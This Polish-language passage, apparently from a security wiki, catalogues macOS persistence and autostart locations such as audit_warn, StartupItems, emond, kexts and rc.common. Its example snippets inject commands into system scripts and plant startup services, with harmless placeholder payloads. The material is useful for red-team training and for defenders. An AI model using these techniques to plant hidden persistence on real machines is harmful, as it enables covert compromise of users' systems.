Następnie, jeśli to konieczne, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Przykład kodu dla Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Opis: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być root, auditd musi być uruchomiony i trzeba spowodować ostrzeżenie
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`/etc/security/audit_warn`**
- Wymagany root
- **Wyzwalacz**: Gdy auditd wykryje ostrzeżenie

#### Opis & Exploit

Za każdym razem, gdy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** jest **uruchamiany**. Możesz więc dodać w nim swój payload.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Możesz wymusić ostrzeżenie za pomocą `sudo audit -n`.

### Elementy startowe

> [!CAUTION] > **To jest przestarzałe, więc w tych katalogach nic nie powinno się znajdować.**

Katalog **StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu tego katalogu musi on zawierać dwa określone pliki:

1. **rc script**: skrypt powłoki uruchamiany przy starcie.
2. Plik **plist**, konkretnie o nazwie `StartupParameters.plist`, zawierający różne ustawienia konfiguracyjne.

Upewnij się, że zarówno **rc script**, jak i plik `StartupParameters.plist` są poprawnie umieszczone w katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i wykorzystać.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Nie mogę znaleźć tego składnika na moim macOS — więcej informacji w writeupie

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Wprowadzony przez Apple, **emond** jest mechanizmem logowania, który wydaje się niedopracowany lub być może porzucony, a mimo to pozostaje dostępny. Choć nie jest szczególnie przydatny dla administratora Mac, ta mało znana usługa może posłużyć jako subtelna metoda persistence dla threat actors, prawdopodobnie niezauważona przez większość macOS admins.

Dla tych, którzy zdają sobie z jej istnienia sprawę, wykrycie złośliwego użycia **emond** jest proste. Systemowy LaunchDaemon tej usługi szuka skryptów do wykonania w jednym katalogu. Aby to sprawdzić, można użyć następującego polecenia:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Opis: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Lokalizacja

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Wymagany root
- **Wyzwalacz**: z XQuartz

#### Opis & Exploit

XQuartz jest **nie jest już instalowany w macOS**, więc jeśli chcesz więcej informacji, sprawdź writeup.

### ~~kext~~

> [!CAUTION]
> Instalacja kext jest tak skomplikowana, nawet jako root, że nie będę tego rozważać jako sposób na escape from sandboxes ani nawet na persistence (chyba że masz exploit)

#### Lokalizacja

Aby zainstalować KEXT jako element uruchamiania, musi być **zainstalowany w jednej z następujących lokalizacji**:

- `/System/Library/Extensions`
- Pliki KEXT wbudowane w system operacyjny OS X.
- `/Library/Extensions`
- Pliki KEXT zainstalowane przez oprogramowanie firm trzecich

Możesz wyświetlić aktualnie załadowane pliki kext za pomocą:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Więcej informacji na temat [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Lokalizacja

- **`/usr/local/bin/amstoold`**
- Wymagane uprawnienia: root

#### Opis i eksploatacja

Najwyraźniej `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego pliku binarnego przy wystawianiu XPC service... problem w tym, że plik binarny nie istniał, więc można było umieścić tam własny program, a gdy XPC service zostanie wywołany, wywołany zostanie twój plik binarny.

Nie mogę już tego znaleźć w moim macOS.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Lokalizacja

- **`/Library/Preferences/Xsan/.xsanrc`**
- Wymagane uprawnienia: root
- **Trigger**: Gdy usługa jest uruchamiana (rzadko)

#### Opis i eksploatacja

Najwyraźniej uruchamianie tego skryptu nie jest zbyt powszechne i nawet nie mogłem go znaleźć w moim macOS, więc jeśli chcesz więcej informacji, sprawdź opis.

### ~~/etc/rc.common~~

> [!CAUTION] > **This isn't working in modern MacOS versions**

Możliwe jest również umieszczenie tutaj **poleceń, które będą wykonywane przy starcie.** Przykładowy zwykły skrypt rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence — techniki i narzędzia

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Źródła

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
